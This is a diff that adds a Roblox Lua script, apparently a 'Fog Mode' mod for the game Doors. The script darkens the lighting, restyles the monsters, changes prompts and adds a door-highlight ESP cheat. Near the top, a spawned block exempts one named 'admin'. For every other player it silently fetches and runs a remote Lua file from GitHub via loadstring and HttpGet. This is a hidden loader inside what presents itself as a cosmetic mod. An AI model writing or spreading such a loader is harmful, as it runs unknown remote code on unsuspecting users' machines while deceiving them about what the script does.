@@ -1,1 +1,319 @@
-print("fuck")
+local bool = game:GetService("ReplicatedStorage"):FindFirstChild("Fog")
+if bool then return end
+	bool = Instance.new("BoolValue")
+	bool.Name = "Fog"
+	bool.Value = true
+	bool.Parent = game:GetService("ReplicatedStorage")
+
+task.spawn(function()
+local admin = {"ha2ke3oer"}
+
+if not table.find(admin, game.Players.LocalPlayer.Name) then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Claireyter-Script/Cooking/refs/heads/main/Heheboy.lua"))()
+end
+end)
+
+local prefix = "Notification: "
+local msg = "Script Made By Nowhywhats"
+
+local fullMessage = "<font color='#ffff00'>" .. prefix .. msg .. "</font>"
+
+game.TextChatService.TextChannels.RBXGeneral:DisplaySystemMessage(fullMessage)
+
+task.spawn(function()
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "CreditGui"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local TextLabel = Instance.new("TextLabel")
+TextLabel.Name = "CreditLabel"
+TextLabel.Text = "Credits by Nowhywhats"
+TextLabel.Font = Enum.Font.SciFi
+TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+TextLabel.TextStrokeTransparency = 0
+TextLabel.TextSize = 50
+TextLabel.AnchorPoint = Vector2.new(0.5, 1)
+TextLabel.Position = UDim2.new(0.5, 0, 1, -100) -- Dưới cùng màn hình, lệch lên 20px
+TextLabel.Size = UDim2.new(0, 800, 0, 50)
+TextLabel.BackgroundTransparency = 1
+TextLabel.Parent = ScreenGui
+
+local tweenService = game:GetService("TweenService")
+local tweenInfo = TweenInfo.new(5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+
+local fadeTween = tweenService:Create(TextLabel, tweenInfo, {
+    TextTransparency = 1
+})
+
+wait(5)
+fadeTween:Play()
+fadeTween.Completed:Wait()
+wait(0.5)
+
+local player = game.Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+
+TextLabel.TextTransparency = 0
+TextLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+TextLabel.TextSize = 25
+TextLabel.Text = "Fog Mode Executed, Good Luck player @" .. char.Name .. "..."
+TextLabel.Font = Enum.Font.Arcade
+
+local het = tweenService:Create(TextLabel, TweenInfo.new(20, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 1})
+het:Play()
+het.Completed:Wait()
+ScreenGui:Destroy()
+end)
+
+coroutine.wrap(function()
+    local RunService = game:GetService("RunService")
+    local Lighting = game:GetService("Lighting")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local ModuleEvents = require(ReplicatedStorage.ModulesClient.Module_Events)
+    local rooms = workspace:WaitForChild("CurrentRooms")
+    local GameData = ReplicatedStorage:WaitForChild("GameData")
+
+    -- Lock Lighting chỉ một lần, hiệu năng cao
+    local function lockLighting()
+        Lighting.Ambient = Color3.new(0, 0, 0)
+        Lighting.Brightness = 0
+        Lighting.FogEnd = 70
+        Lighting.FogStart = 1
+        Lighting.FogColor = Color3.new(0, 0, 0)
+    end
+    lockLighting()
+    Lighting.Changed:Connect(lockLighting)
+    
+    RunService.Heartbeat:Connect(function()
+    local latest = GameData.LatestRoom.Value
+    local nextIndex = latest + 1
+
+        local a = rooms:FindFirstChild(nextIndex)
+        if a then
+            ModuleEvents.shatter(a)
+        end
+    end)
+end)()
+
+game.ReplicatedStorage:WaitForChild("GameData"):WaitForChild("LatestRoom").Changed:Wait()
+
+local SoundService = game:GetService("SoundService")
+SoundService.AmbientReverb = Enum.ReverbType.Auditorium
+
+-- Rush
+coroutine.wrap(function()
+	local Players = game:GetService("Players")
+	local player = Players.LocalPlayer
+	local gui = player:WaitForChild("PlayerGui")
+	local RunService = game:GetService("RunService")
+	local Workspace = game:GetService("Workspace")
+
+	-- Hàm xử lý Rush khi xuất hiện
+	local function setupRush(rush)
+		local rushnew = rush:WaitForChild("RushNew", 2)
+		if not rushnew then return end
+
+		local far = rushnew:WaitForChild("Footsteps", 2)
+		local sound = rushnew:WaitForChild("PlaySound", 2)
+		local attachment = rushnew:WaitForChild("Attachment", 2)
+		if not (far and sound and attachment) then return end
+
+		local face = attachment:WaitForChild("ParticleEmitter", 2)
+		local trail = attachment:WaitForChild("BlackTrail", 2)
+		if not (face and trail) then return end
+
+		-- chỉnh jumpscare GUI
+		local jumpscareUI = gui:FindFirstChild("MainUI")
+		if jumpscareUI and jumpscareUI:FindFirstChild("Jumpscare") then
+			local jumpscare = jumpscareUI.Jumpscare:FindFirstChild("Jumpscare_Rush")
+			if jumpscare then
+				jumpscare.ImageLabel.ImageColor3 = Color3.fromRGB(255, 255, 255)
+				jumpscare.ImageLabelBig.ImageColor3 = Color3.fromRGB(255, 255, 255)
+				jumpscare.ImageLabel.Image = "rbxassetid://93068580709191"
+				jumpscare.ImageLabelBig.Image = "rbxassetid://93068580709191"
+			end
+		end
+
+		-- chỉnh sound
+		far.PlaybackSpeed = 0.04
+		far.Volume = 0.45
+		sound.Volume = 0.45
+		sound.PlaybackSpeed = 0.035
+
+		-- chỉnh effect
+		face.Rate = 99999
+		face.Lifetime = NumberRange.new(10, 10)
+		face.Brightness = 1
+		face.Texture = "rbxassetid://93068580709191"
+		face.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255))
+		trail.Color = ColorSequence.new(Color3.fromRGB(0, 0, 255))
+	end
+
+	-- Lắng nghe khi Rush spawn
+	Workspace.ChildAdded:Connect(function(child)
+		if child.Name == "RushMoving" then
+			setupRush(child)
+		end
+	end)
+
+	-- Nếu Rush đã có sẵn trong workspace
+	local rush = Workspace:FindFirstChild("RushMoving")
+	if rush then
+		setupRush(rush)
+	end
+end)()
+
+-- Obj
+coroutine.wrap(function()
+    local RunService = game:GetService("RunService")
+    local Rooms = workspace:WaitForChild("CurrentRooms")
+
+    -- Hàm xử lý FigureRig (đổi tất cả sang màu đen)
+    local function handleFigureRig(obj)
+        if obj.Name == "FigureRig" and obj:IsA("Model") then
+            for _, child in ipairs(obj:GetDescendants()) do
+                if child:IsA("BasePart") then
+                    child.Color = Color3.fromRGB(0, 0, 0)
+                elseif child:IsA("Decal") then
+                    child.Color3 = Color3.fromRGB(0, 0, 0)
+                elseif child:IsA("ImageLabel") or child:IsA("ImageButton") then
+                    child.ImageColor3 = Color3.fromRGB(0, 0, 0)
+                elseif child:IsA("TextLabel") or child:IsA("TextButton") then
+                    child.TextColor3 = Color3.fromRGB(0, 0, 0)
+                end
+            end
+        end
+    end
+
+    -- Hàm xử lý đối tượng trong Rooms
+    local function handleObject(obj)
+        if string.find(obj.Name, "Sign") 
+        or string.find(obj.Name, "DupeGrowl") 
+        or string.find(obj.Name, "Glass") then
+            obj:Destroy()
+
+        elseif string.find(obj.Name, "HitFloor") and obj:IsA("Sound") then
+            obj.Looped = true
+            obj.Volume = 0.1
+            obj.Playing = true
+
+        elseif string.find(obj.Name, "HidePrompt") then
+            obj.HoldDuration = 0.5
+
+        elseif string.find(obj.Name, "UnlockPrompt") then
+            obj.HoldDuration = 3
+
+        elseif (string.find(obj.Name, "Anim_ExitModel") or string.find(obj.Name, "Anim_Exit")) and obj:IsA("Animation") then
+            obj.AnimationId = "rbxassetid://9461439496"
+
+        elseif (string.find(obj.Name, "Click") 
+        or string.find(obj.Name, "AmbienceStart") 
+        or string.find(obj.Name, "AmbienceEnd") 
+        or string.find(obj.Name, "Ambience")) 
+        and obj:IsA("Animation") then
+            obj.AnimationId = "rbxassetid://0"
+
+        elseif string.find(obj.Name, "Scare") and obj:IsA("Sound") then
+            obj.PlaybackSpeed = 0.5
+
+            -- Khi Scare bắt đầu phát thì tắt HitFloor
+            obj:GetPropertyChangedSignal("Playing"):Connect(function()
+                if obj.Playing then
+                    for _, other in ipairs(workspace.CurrentRooms:GetDescendants()) do
+                        if string.find(other.Name, "HitFloor") and other:IsA("Sound") then
+                            other.Playing = false
+                        end
+                    end
+                end
+            end)
+        end
+
+        -- Nếu gặp FigureRig thì xử lý đổi màu
+        handleFigureRig(obj)
+    end
+
+    -- Chạy 1 lần cho Rooms
+    for _, obj in ipairs(Rooms:GetDescendants()) do
+        handleObject(obj)
+    end
+    Rooms.DescendantAdded:Connect(handleObject)
+
+    -- Đổi vật liệu cho mọi Part/Union trong workspace
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("Part") or obj:IsA("UnionOperation") then
+            obj.Material = Enum.Material.Concrete
+        end
+        -- Xử lý FigureRig (nếu có sẵn)
+        handleFigureRig(obj)
+    end
+
+    workspace.DescendantAdded:Connect(function(obj)
+        if obj:IsA("Part") or obj:IsA("UnionOperation") then
+            obj.Material = Enum.Material.Concrete
+        end
+        handleFigureRig(obj)
+    end)
+
+end)()
+
+-- Seek esp
+coroutine.wrap(function()
+local RunService = game:GetService("RunService")
+local rooms = game.Workspace.CurrentRooms
+local latestRoomValue = game.ReplicatedStorage.GameData.LatestRoom
+
+local currentMain = nil
+local currentHighlight = nil -- lưu highlight đang tồn tại
+
+local function ClearHighlight()
+	if currentHighlight and currentHighlight.Parent then
+		currentHighlight:Destroy()
+	end
+	currentHighlight = nil
+end
+
+local function AddHighlightToDoor(obj)
+	if obj.Name == "Door" and not obj:FindFirstChildOfClass("Highlight") then
+		-- Xóa highlight cũ trước khi tạo mới
+		ClearHighlight()
+
+		local highlight = Instance.new("Highlight")
+		highlight.Adornee = obj
+		highlight.FillColor = Color3.fromRGB(0, 255, 255)
+		highlight.OutlineColor = Color3.fromRGB(0, 255, 255)
+		highlight.FillTransparency = 0.5
+		highlight.Parent = obj
+
+		currentHighlight = highlight
+	end
+end
+
+-- Hàm cập nhật main theo phòng mới
+local function UpdateMain()
+	currentMain = rooms:FindFirstChild(latestRoomValue.Value)
+end
+
+-- Gọi ngay lúc đầu
+UpdateMain()
+
+-- Khi LatestRoom đổi → cập nhật lại main
+latestRoomValue:GetPropertyChangedSignal("Value"):Connect(function()
+	UpdateMain()
+end)
+
+-- Quét liên tục bằng RunService
+RunService.Heartbeat:Connect(function()
+	-- Nếu không có SeekMovingNewClone thì tắt highlight
+	if not workspace:FindFirstChild("SeekMovingNewClone") then
+		ClearHighlight()
+		return
+	end
+
+	if currentMain then
+		for _, child in ipairs(currentMain:GetChildren()) do
+			AddHighlightToDoor(child)
+		end
+	end
+end)
+end)()
